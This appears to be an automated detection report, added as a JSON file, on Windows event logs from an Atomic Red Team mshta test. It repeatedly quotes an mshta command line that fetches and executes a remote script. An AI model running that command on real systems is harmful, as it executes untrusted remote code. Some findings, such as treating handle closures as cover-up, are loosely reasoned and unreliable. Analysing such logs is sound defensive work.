@@ -1,0 +1,210 @@
+{
+  "overall_assessment": "SUSPICIOUS",
+  "total_events_analyzed": 1151,
+  "analysis_summary": "Suspicious activity detected involving mshta.exe executing a script from a GitHub URL, potentially downloading malicious payloads and modifying system settings. The process also made outbound network connections and accessed sensitive registry keys. The event log clearing (EventID 1102) suggests an attempt to cover tracks.",
+  "reasoning": "The investigation identified the execution of `mshta.exe` via `cmd.exe` with a command line referencing a script hosted on GitHub (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct`). This is a common technique for malware delivery and execution (T1218.005). The `mshta.exe` process subsequently loaded DLLs associated with internet access (`urlmon.dll`, `winhttp.dll`) and performed suspicious registry modifications, including accessing sensitive keys like `\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Lsa` and `ZoneMap`. These actions, combined with outbound network connections initiated by `mshta.exe` (to 151.101.248.133 on port 443), indicate a high likelihood of malicious activity. Additionally, the `svchost.exe` process was observed calling privileged services with `SeTcbPrivilege`, which could indicate an attempt at privilege escalation. The clearing of the audit log (EventID 1102) by the user 'wardog' further supports the suspicious nature of these events, indicating an attempt to hide malicious actions.",
+  "abnormal_event_ids": [
+    "4688",
+    "7",
+    "4663",
+    "4656",
+    "4658",
+    "4673",
+    "1",
+    "13",
+    "12",
+    "11",
+    "2",
+    "23",
+    "5156",
+    "5158",
+    "1102"
+  ],
+  "abnormal_events": [
+    {
+      "event_id": "1102",
+      "event_description": "The audit log was cleared.\n\nSubject:\n\tSecurity ID:\tS-1-5-21-3940915590-64593676-1414006259-500\n\tAccount Name:\twardog\n\tDomain Name:\tWORKSTATION5\n\tLogon ID:\t0xC61D9",
+      "why_abnormal": "Clearing the audit log is a common tactic used by attackers to remove evidence of their activities.",
+      "severity": "HIGH",
+      "indicators": [
+        "audit log cleared",
+        "wardog"
+      ],
+      "tool_enrichment": {}
+    },
+    {
+      "event_id": "4688",
+      "event_description": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-3940915590-64593676-1414006259-500\n\tAccount Name:\t\twardog\n\tAccount Domain:\t\tWORKSTATION5\n\tLogon ID:\t\t0xC61D9\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x275c\n\tNew Process Name:\tC:\\Windows\\System32\\mshta.exe\n\tToken Elevation Type:\t%%1936\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x27d4\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tmshta.exe  javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();",
+      "why_abnormal": "Execution of mshta.exe with a command line that downloads a script from an external URL (GitHub) is a common technique for malware delivery and execution.",
+      "severity": "HIGH",
+      "indicators": [
+        "mshta.exe",
+        "javascript:",
+        "GetObject('script:https://raw.githubusercontent.com..."
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 4688 | User: wardog | Process: C:\\Windows\\System32\\mshta.exe | CMD: mshta.exe  javascript:a=(GetObject('script:https://raw.gi...",
+        "decoded_command": "The decoder tool did not find suspicious patterns in the provided string."
+      }
+    },
+    {
+      "event_id": "7",
+      "event_description": "Image loaded: C:\\Windows\\System32\\urlmon.dll",
+      "why_abnormal": "urlmon.dll is often used by mshta.exe to download content from the internet, which is consistent with the suspicious command line.",
+      "severity": "MEDIUM",
+      "indicators": [
+        "urlmon.dll"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 7 | Process: C:\\Windows\\System32\\mshta.exe | ImageLoaded: C:\\Windows\\System32\\urlmon.dll"
+      }
+    },
+    {
+      "event_id": "4663",
+      "event_description": "An attempt was made to access an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-3940915590-64593676-1414006259-500\n\tAccount Name:\t\twardog\n\tAccount Domain:\t\tWORKSTATION5\n\tLogon ID:\t\t0xC61D9\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Lsa\n\tHandle ID:\t\t0x90",
+      "why_abnormal": "Accessing the LSA registry key by mshta.exe could indicate attempts to gather security-related information or modify security settings.",
+      "severity": "HIGH",
+      "indicators": [
+        "mshta.exe",
+        "\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Lsa"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 4663 | User: wardog | Process: C:\\Windows\\System32\\mshta.exe | File: \\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Lsa"
+      }
+    },
+    {
+      "event_id": "4656",
+      "event_description": "A handle to an object was requested.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-3940915590-64593676-1414006259-500\n\tAccount Name:\t\twardog\n\tAccount Domain:\t\tWORKSTATION5\n\tLogon ID:\t\t0xC61D9\n\nObject:\n\tObject Server:\t\tSecurity\n\tObject Type:\t\tKey\n\tObject Name:\t\t\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Lsa",
+      "why_abnormal": "Similar to EventID 4663, requesting handle access to the LSA registry key by mshta.exe is suspicious.",
+      "severity": "HIGH",
+      "indicators": [
+        "mshta.exe",
+        "\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Lsa"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 4656 | User: wardog | Process: C:\\Windows\\System32\\mshta.exe | File: \\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Lsa"
+      }
+    },
+    {
+      "event_id": "4658",
+      "event_description": "The handle to an object was closed.\n\nSubject :\n\tSecurity ID:\t\tS-1-5-21-3940915590-64593676-1414006259-500\n\tAccount Name:\t\twardog\n\tAccount Domain:\t\tWORKSTATION5\n\tLogon ID:\t\t0xC61D9\n\nObject:\n\tObject Server:\t\tSecurity\n\tHandle ID:\t\t0x4624",
+      "why_abnormal": "The closure of handles related to mshta.exe's activity, particularly after accessing sensitive registry keys, warrants attention as it could be part of an attempt to cover tracks.",
+      "severity": "MEDIUM",
+      "indicators": [
+        "mshta.exe"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 4658 | User: wardog | Process: C:\\Windows\\System32\\mshta.exe"
+      }
+    },
+    {
+      "event_id": "4673",
+      "event_description": "A privileged service was called.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-3940915590-64593676-1414006259-500\n\tAccount Name:\t\twardog\n\tAccount Domain:\t\tWORKSTATION5\n\tLogon ID:\t\t0xC61D9\n\nService:\n\tServer:\tSecurity\n\tService Name:\t-\n\nProcess:\n\tProcess ID:\t0x3b0\n\tProcess Name:\tC:\\Windows\\System32\\svchost.exe\n\nService Request Information:\n\tPrivileges:\t\tSeTcbPrivilege",
+      "why_abnormal": "The svchost.exe process, running under the 'wardog' user context, is calling a privileged service with SeTcbPrivilege. This could indicate an attempt to gain elevated privileges.",
+      "severity": "HIGH",
+      "indicators": [
+        "svchost.exe",
+        "SeTcbPrivilege"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 4673 | User: wardog | Process: C:\\Windows\\System32\\svchost.exe"
+      }
+    },
+    {
+      "event_id": "1",
+      "event_description": "Process Create:\nRuleName: -\nUtcTime: 2020-10-22 06:21:37.849\nProcessGuid: {39e4a257-24f1-5f91-0e13-000000000700}\nProcessId: 10076\nImage: C:\\Windows\\System32\\mshta.exe\nFileVersion: 11.00.18362.1 (WinBuild.160101.0800)\nDescription: Microsoft (R) HTML Application host\nProduct: Internet Explorer\nCompany: Microsoft Corporation\nOriginalFileName: MSHTA.EXE\nCommandLine: mshta.exe  javascript:a=(GetObject(\\'script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct\\')).Exec();close();\nCurrentDirectory: C:\\Users\\wardog\\\nUser: WORKSTATION5\\wardog\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\nLogonId: 0xC61D9\nTerminalSessionId: 2\nIntegrityLevel: High",
+      "why_abnormal": "This event confirms the creation of the mshta.exe process with the suspicious command line, initiated by the 'wardog' user.",
+      "severity": "HIGH",
+      "indicators": [
+        "mshta.exe",
+        "javascript:",
+        "GetObject('script:https://raw.githubusercontent.com..."
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 1 | User: WORKSTATION5\\wardog | Process: C:\\Windows\\System32\\mshta.exe | CMD: mshta.exe  javascript:a=(GetObject(\\'script:https://raw.gi..."
+      }
+    },
+    {
+      "event_id": "13",
+      "event_description": "Registry value set:\nRuleName: -\nEventType: SetValue\nUtcTime: 2020-10-22 06:21:38.264\nProcessGuid: {39e4a257-24f1-5f91-0e13-000000000700}\nProcessId: 10076\nImage: C:\\windows\\system32\\mshta.exe\nTargetObject: HKU\\S-1-5-21-3940915590-64593676-1414006259-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass",
+      "why_abnormal": "Modification of internet settings, specifically 'ProxyBypass', by mshta.exe could be an attempt to bypass network security controls or facilitate further malicious activity.",
+      "severity": "HIGH",
+      "indicators": [
+        "mshta.exe",
+        "ProxyBypass"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 13 | Process: C:\\windows\\system32\\mshta.exe | Registry: HKU\\S-1-5-21-3940915590-64593676-1414006259-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass"
+      }
+    },
+    {
+      "event_id": "12",
+      "event_description": "Registry object added or deleted:\nRuleName: -\nEventType: CreateKey\nUtcTime: 2020-10-22 06:21:38.249\nProcessGuid: {39e4a257-24f1-5f91-0e13-000000000700}\nProcessId: 10076\nImage: C:\\windows\\system32\\mshta.exe\nTargetObject: HKU\\S-1-5-21-3940915590-64593676-1414006259-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap",
+      "why_abnormal": "The creation of registry keys under ZoneMap by mshta.exe suggests potential manipulation of internet security zones.",
+      "severity": "MEDIUM",
+      "indicators": [
+        "mshta.exe",
+        "ZoneMap"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 12 | Process: C:\\windows\\system32\\mshta.exe | Registry: HKU\\S-1-5-21-3940915590-64593676-1414006259-500\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap"
+      }
+    },
+    {
+      "event_id": "11",
+      "event_description": "Network connection: Process: C:\\Windows\\System32\\RuntimeBroker.exe | File: C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\5RTJ1YUV0FBTMF9B841P.temp",
+      "why_abnormal": "RuntimeBroker.exe making network connections to a temporary file location could be related to the execution chain initiated by mshta.exe.",
+      "severity": "LOW",
+      "indicators": [
+        "RuntimeBroker.exe",
+        "CustomDestinations"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 11 | Process: C:\\Windows\\System32\\RuntimeBroker.exe | File: C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\5RTJ1YUV0FBTMF9B841P.temp"
+      }
+    },
+    {
+      "event_id": "23",
+      "event_description": "File delete: User: WORKSTATION5\\wardog | Process: C:\\Windows\\System32\\RuntimeBroker.exe | File: C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\ff99ba2fb2e34b73.customDestinations-ms~RF145270c4.TMP",
+      "why_abnormal": "The deletion of a temporary file by RuntimeBroker.exe, potentially related to the mshta.exe execution, could be an attempt to clean up.",
+      "severity": "LOW",
+      "indicators": [
+        "RuntimeBroker.exe",
+        "CustomDestinations",
+        ".temp"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 23 | User: WORKSTATION5\\wardog | Process: C:\\Windows\\System32\\RuntimeBroker.exe | File: C:\\Users\\wardog\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\ff99ba2fb2e34b73.customDestinations-ms~RF145270c4.TMP"
+      }
+    },
+    {
+      "event_id": "5156",
+      "event_description": "The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t10076\n\tApplication Name:\t\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\mshta.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t192.168.2.5\n\tSource Port:\t\t52271\n\tDestination Address:\t151.101.248.133\n\tDestination Port:\t\t443",
+      "why_abnormal": "mshta.exe initiating an outbound connection to an external IP address (151.101.248.133) on port 443 is suspicious, especially given the context of downloading a script.",
+      "severity": "HIGH",
+      "indicators": [
+        "mshta.exe",
+        "151.101.248.133",
+        "443"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 5156 | ProcessID: 10076 | Application: \\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\mshta.exe | SourceAddress: 192.168.2.5 | DestAddress: 151.101.248.133"
+      }
+    },
+    {
+      "event_id": "5158",
+      "event_description": "The Windows Filtering Platform has permitted a bind to a local port.\n\nApplication Information:\n\tProcess ID:\t\t10076\n\tApplication Name:\t\\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\mshta.exe",
+      "why_abnormal": "mshta.exe binding to a local port can be part of establishing a communication channel for C2 or data exfiltration.",
+      "severity": "MEDIUM",
+      "indicators": [
+        "mshta.exe"
+      ],
+      "tool_enrichment": {
+        "timeline_context": "EventID 5158 | ProcessID: 10076 | Application: \\\\device\\\\harddiskvolume2\\\\windows\\\\system32\\\\mshta.exe"
+      }
+    }
+  ],
+  "execution_time_seconds": 34.01,
+  "execution_time_formatted": "34.01s",
+  "iteration_count": 1
+}
